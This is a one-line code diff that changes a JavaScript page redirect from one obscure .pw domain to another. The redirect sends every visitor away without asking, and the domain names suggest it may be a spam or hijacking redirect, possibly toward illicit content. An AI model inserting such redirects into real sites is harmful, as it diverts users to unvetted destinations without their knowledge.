@@ -1,1 +1,1 @@
-self.location.href="https://www.loli90.pw"
+self.location.href="https://d.ailuo99.pw"
